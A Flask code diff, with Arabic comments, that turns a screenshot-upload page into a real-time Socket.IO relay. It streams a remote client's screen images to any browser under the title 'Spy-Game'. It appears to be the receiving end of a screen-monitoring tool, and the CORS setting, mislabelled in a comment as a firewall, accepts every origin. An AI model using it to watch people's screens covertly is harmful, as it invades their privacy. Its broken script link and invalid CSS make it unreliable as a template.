@@ -1,49 +1,53 @@
-from flask import Flask, request, render_template_string
-import base64
+from flask import Flask, render_template_string
+from flask_socketio import SocketIO, emit
 
 app = Flask(__name__)
-
-# متغير لحفظ آخر صورة مستلمة في ذاكرة السيرفر
-last_image_b64 = ""
-
-@app.route('/upload', methods=['POST'])
-def upload():
-    global last_image_b64
-    # استقبال ملف الصورة من العميل
-    file = request.files.get('image')
-    if file:
-        img_bytes = file.read()
-        # تحويل الصورة إلى نص b64 ليتم عرضها بسهولة في المتصفح
-        last_image_b64 = base64.b64encode(img_bytes).decode('utf-8')
-        return "OK", 200
-    return "No Image", 400
+# إعداد السوكيت وتفعيل جدار الحماية للسماح بالاتصال
+socketio = SocketIO(app, cors_allowed_origins="*")
 
 @app.route('/')
 def index():
-    # صفحة ويب بسيطة بتصميم داكن تقوم بتحديث نفسها تلقائياً
+    # صفحة ويب تستقبل البث وتحدث الصورة فوراً عبر الجافاسكريبت بدون إعادة تحميل
     html = '''
     <html>
         <head>
-            <title>Remote Screen Live</title>
-            <meta http-equiv="refresh" content="1">
+            <title>Spy-Game Ultimate Stream</title>
+            <script src="https://socket.io"></script>
         </head>
-        <body style="background:#121212; text-align:center; color:white; font-family:sans-serif; padding-top:30px;">
-            <h1 style="color:#00ff88;">📡 Spy-Game Live Screen</h1>
-            <p>The page refreshes every 1 second automatically.</p>
-            <hr style="border:1px solid #333; width:80%;">
-            <br>
-            {% if img %}
-                <img src="data:image/jpeg;base64,{{ img }}" style="max-width:85%; border:4px solid #00ff88; border-radius:8px; box-shadow: 0px 0px 20px #00ff8855;">
-            {% else %}
-                <div style="padding: 50px; background:#1e1e1e; display:inline-block; border-radius:8px; border:1px dashed #555;">
-                    <p style="color:#aaa;">⏳ Waiting for connection / client screenshots...</p>
-                </div>
-            {% endif %}
+        <body style="background:#121212; text-align:center; color:white; font-family:sans-serif; padding-top:20px;">
+            <h1 style="color:#00ff88;">📡 Spy-Game Real-Time Stream</h1>
+            <p>Status: <span id="status" style="color:red;">Disconnected</span></p>
+            <hr style="border:1px solid #333; width:80%; mb:20px;">
+            <img id="live-screen" style="max-width:85%; border:4px solid #00ff88; border-radius:8px; display:none;">
+            <div id="waiting" style="padding: 50px; background:#1e1e1e; display:inline-block; border-radius:8px; border:1px dashed #555;">
+                <p style="color:#aaa;">⏳ Waiting for stream data...</p>
+            </div>
+
+            <script>
+                const socket = io();
+                const img = document.getElementById('live-screen');
+                const waiting = document.getElementById('waiting');
+                const status = document.getElementById('status');
+
+                socket.on('connect', () => { status.innerText = 'Connected'; status.style.color = '#00ff88'; });
+                socket.on('disconnect', () => { status.innerText = 'Disconnected'; status.style.color = 'red'; });
+
+                // استقبال الصورة وعرضها فوراً في نفس اللحظة
+                socket.on('stream_update', (data) => {
+                    waiting.style.display = 'none';
+                    img.style.display = 'inline-block';
+                    img.src = "data:image/jpeg;base64," + data.image;
+                });
+            </script>
         </body>
     </html>
     '''
-    return render_template_string(html, img=last_image_b64)
+    return render_template_string(html)
+
+@socketio.on('video_stream')
+def handle_stream(data):
+    # إعادة توجيه الصورة القادمة من العميل إلى المتصفح فوراً
+    emit('stream_update', {'image': data['image']}, broadcast=True)
 
 if __name__ == '__main__':
-    # المنفذ الافتراضي لمنصة Render هو 10000
-    app.run(host='0.0.0.0', port=10000)
+    socketio.run(app, host='0.0.0.0', port=10000)
